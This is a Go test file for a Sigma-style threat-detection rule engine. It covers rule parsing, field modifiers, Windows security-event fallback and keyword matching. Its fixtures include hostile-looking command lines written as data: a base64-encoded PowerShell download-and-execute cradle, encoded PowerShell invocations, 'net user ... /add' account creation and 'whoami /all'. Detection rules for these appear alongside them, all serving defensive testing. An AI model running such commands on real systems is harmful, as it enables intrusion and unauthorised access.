package detect

import (
	"encoding/base64"
	"strings"
	"testing"

	"github.com/Netdoodle/homexdr/shared/event"
)

func winProc(image, cmd, parent string) *event.Event {
	name := image[strings.LastIndex(image, `\`)+1:]
	return &event.Event{
		ID:    event.NewID(),
		Host:  event.Host{ID: "h", Name: "desk", OS: &event.OS{Platform: "windows"}},
		Event: event.Meta{Kind: "event", Category: []string{"process"}, Type: []string{"start"}, Module: "etw"},
		Process: &event.Process{
			Name: name, Executable: image, CommandLine: cmd,
			Hash:   &event.Hash{SHA256: "aabbcc"},
			Parent: &event.Process{Executable: parent},
			User:   &event.User{Name: "alice"},
		},
	}
}

func mustRule(t *testing.T, src string) *Rule {
	t.Helper()
	r, err := ParseRule([]byte(src))
	if err != nil {
		t.Fatalf("ParseRule: %v\n%s", err, src)
	}
	return r
}

func TestRuleMatching(t *testing.T) {
	encPS := mustRule(t, `
title: Encoded PowerShell
id: 11111111-1111-1111-1111-111111111111
level: high
tags: [attack.execution, attack.t1059.001]
logsource: {product: windows, category: process_creation}
detection:
  selection_img:
    - Image|endswith: '\powershell.exe'
    - OriginalFileName: 'PowerShell.EXE'
  selection_cli:
    CommandLine|windash|contains: '-enc'
  filter_admin:
    ParentImage|startswith: 'C:\Program Files\Admin'
  condition: all of selection_* and not 1 of filter_*
`)
	cases := []struct {
		ev   *event.Event
		want bool
	}{
		{winProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -nop -enc SQBFAFgA`, `C:\Windows\explorer.exe`), true},
		{winProc(`C:\Windows\System32\WindowsPowerShell\v1.0\POWERSHELL.EXE`, `powershell /ENC SQBFAFgA`, `C:\Windows\explorer.exe`), true},
		{winProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -File x.ps1`, `C:\Windows\explorer.exe`), false},
		{winProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -enc AAA`, `C:\Program Files\Admin\tool.exe`), false},
		{winProc(`C:\Windows\System32\cmd.exe`, `cmd /c -enc`, `C:\Windows\explorer.exe`), false},
	}
	for i, c := range cases {
		if got := encPS.Match(NewDoc(c.ev)); got != c.want {
			t.Errorf("case %d: match = %v, want %v (%s)", i, got, c.want, c.ev.Process.CommandLine)
		}
	}
	linux := winProc(`/usr/bin/pwsh`, `pwsh -enc AAA`, `/bin/bash`)
	linux.Host.OS.Platform = "linux"
	linux.Process.Executable = `C:\fake\powershell.exe`
	if encPS.Match(NewDoc(linux)) {
		t.Error("windows rule matched a linux event")
	}

	m := MitreFromTags(encPS.Tags)
	if len(m) != 2 || m[0].Tactic != "Execution" || m[1].TechniqueID != "T1059.001" || m[1].Technique != "PowerShell" {
		t.Errorf("MitreFromTags = %+v", m)
	}
}

func TestModifiers(t *testing.T) {
	payload := base64.StdEncoding.EncodeToString([]byte("xIEX (New-Object Net.WebClient).DownloadString('http://a')"))
	b64 := mustRule(t, `
title: b64 IEX
id: b64
logsource: {category: process_creation}
detection:
  sel:
    CommandLine|base64offset|contains: 'IEX ('
  condition: sel
`)
	if !b64.Match(NewDoc(winProc(`C:\x\powershell.exe`, "powershell -enc "+payload, ""))) {
		t.Error("base64offset did not match")
	}
	if b64.Match(NewDoc(winProc(`C:\x\powershell.exe`, "powershell -enc "+base64.StdEncoding.EncodeToString([]byte("hello world")), ""))) {
		t.Error("base64offset false positive")
	}

	net := &event.Event{
		Host:        event.Host{OS: &event.OS{Platform: "linux"}},
		Event:       event.Meta{Category: []string{"network"}, Type: []string{"connection"}},
		Process:     &event.Process{Executable: "/usr/bin/curl"},
		Network:     &event.Network{Transport: "tcp", Direction: "outbound"},
		Destination: &event.Endpoint{IP: "10.20.30.40", Port: 4444},
	}
	cidr := mustRule(t, `
title: c
id: c
logsource: {category: network_connection, product: linux}
detection:
  sel:
    DestinationIp|cidr: ['10.0.0.0/8', '192.168.0.0/16']
    DestinationPort|gte: 4000
    Initiated: 'true'
  condition: sel
`)
	if !cidr.Match(NewDoc(net)) {
		t.Error("cidr/gte/Initiated did not match")
	}
	net.Destination.IP = "8.8.8.8"
	if cidr.Match(NewDoc(net)) {
		t.Error("cidr matched outside range")
	}

	misc := mustRule(t, `
title: misc
id: misc
logsource: {category: process_creation}
detection:
  sel_re:
    CommandLine|re: '(?i)whoami\s+/all'
  sel_all:
    CommandLine|contains|all: ['net', 'user', '/add']
  sel_null:
    IntegrityLevel: null
    Image|endswith: '\rare.exe'
  condition: 1 of sel_*
`)
	if !misc.Match(NewDoc(winProc(`C:\w\whoami.exe`, `whoami   /ALL`, ""))) {
		t.Error("re did not match")
	}
	if !misc.Match(NewDoc(winProc(`C:\w\net.exe`, `net user bob P@ss /add`, ""))) {
		t.Error("contains|all did not match")
	}
	if misc.Match(NewDoc(winProc(`C:\w\net.exe`, `net user bob`, ""))) {
		t.Error("contains|all matched with a missing value")
	}
	if !misc.Match(NewDoc(winProc(`C:\w\rare.exe`, `rare`, ""))) {
		t.Error("null value did not match absent field")
	}
	withIL := winProc(`C:\w\rare.exe`, `rare`, "")
	withIL.Process.IntegrityLevel = "high"
	if misc.Match(NewDoc(withIL)) {
		t.Error("null value matched a present field")
	}

	hashes := mustRule(t, `
title: h
id: h
logsource: {category: process_creation}
detection:
  sel:
    Hashes|contains: 'SHA256=AABBCC'
    User: alice
  condition: sel
`)
	if !hashes.Match(NewDoc(winProc(`C:\a.exe`, "a", ""))) {
		t.Error("Hashes / User mapping did not match")
	}
}

func TestSecurityEventDataFallback(t *testing.T) {
	r := mustRule(t, `
title: Failed logon for admin
id: fl
logsource: {product: windows, service: security}
detection:
  sel:
    EventID: 4625
    TargetUserName: Administrator
    LogonType: [3, 10]
  condition: sel
`)
	ev := &event.Event{
		Host:  event.Host{OS: &event.OS{Platform: "windows"}},
		Event: event.Meta{Category: []string{"authentication"}, Code: "4625", Provider: "Microsoft-Windows-Security-Auditing"},
		Data:  map[string]any{"TargetUserName": "administrator", "LogonType": "10"},
	}
	if !r.Match(NewDoc(ev)) {
		t.Error("EventData fallback did not match")
	}
	ev.Event.Provider = "Microsoft-Windows-Sysmon"
	if r.Match(NewDoc(ev)) {
		t.Error("service filter did not apply")
	}
}

func TestKeywordsAndErrors(t *testing.T) {
	kw := mustRule(t, `
title: kw
id: kw
logsource: {product: linux, service: auth}
detection:
  keywords:
    - 'Failed password for root'
    - 'Invalid user'
  condition: keywords
`)
	ev := &event.Event{
		Host:    event.Host{OS: &event.OS{Platform: "linux"}},
		Event:   event.Meta{Dataset: "linux.auth"},
		Message: "sshd[123]: Failed password for root from 1.2.3.4 port 22 ssh2",
	}
	if !kw.Match(NewDoc(ev)) {
		t.Error("keyword did not match")
	}

	bad := []string{
		"title: x\nid: x\nlogsource: {}\ndetection:\n  sel: {a: 1}\n  condition: sel | count() > 5\n",
		"title: x\nid: x\nlogsource: {}\ndetection:\n  sel: {a|nope: 1}\n  condition: sel\n",
		"title: x\nid: x\nlogsource: {}\ndetection:\n  sel: {a: 1}\n  condition: missing\n",
		"title: x\nid: x\nlogsource: {}\ndetection:\n  sel: {a: 1}\n",
		"id: x\nlogsource: {}\ndetection:\n  sel: {a: 1}\n  condition: sel\n",
	}
	for _, src := range bad {
		if _, err := ParseRule([]byte(src)); err == nil {
			t.Errorf("expected error for:\n%s", src)
		}
	}
}

func TestEngine(t *testing.T) {
	e := NewEngine()
	if len(e.Evaluate(winProc(`C:\a.exe`, "a", ""))) != 0 {
		t.Fatal("empty engine matched")
	}
	e.SetRules([]*Rule{mustRule(t, "title: any\nid: any\nlogsource: {category: process_creation}\ndetection:\n  sel: {Image|endswith: 'a.exe'}\n  condition: sel\n")})
	if hits := e.Evaluate(winProc(`C:\a.exe`, "a", "")); len(hits) != 1 || hits[0].ID != "any" {
		t.Fatalf("hits = %v", hits)
	}
}
